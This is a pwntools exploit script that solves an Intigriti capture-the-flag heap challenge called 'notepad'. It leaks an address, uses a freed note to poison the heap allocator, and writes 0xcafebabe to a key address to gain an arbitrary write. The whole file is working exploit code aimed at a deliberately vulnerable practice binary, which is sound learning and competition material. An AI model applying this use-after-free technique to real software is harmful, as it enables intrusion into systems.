#!/usr/bin/env python3

from pwn import *

exe = ELF("./notepad_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("notepad.ctf.intigriti.io", 1341)

    return r


def main():
    r = conn()
    input()
    r.recvuntil(b'Here a gift: ')
    main_addr = int(r.recv(16).decode(), 16)
    key_addr = main_addr + 0x200eb2
    info(b'Main address: ' + hex(main_addr).encode())
    info(b'Key address: ' + hex(key_addr).encode())
    # Create note: 
    for i in range(2): 
        r.sendlineafter(b'> ', b'1')
        r.sendlineafter(b'> ', str(i).encode())
        r.sendlineafter(b'> ', b'20')
        r.sendlineafter(b'> ', b'A')
    # Delete note
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b'> ', b'1')
    # pause()
    # Edit note
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'> ', b'0')
    # pause()
    payload = b'A'*16 + p64(0) + p64(0x20) + p64(key_addr)
    r.sendlineafter(b'> ', payload)
    pause()
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'> ', b'20')
    r.sendlineafter(b'> ', b'1')

    # pause()

    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'> ', b'20')
    r.sendlineafter(b'> ', p64(0xcafebabe))
    pause()
    r.sendlineafter(b'> ', b'5')
    pause()
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
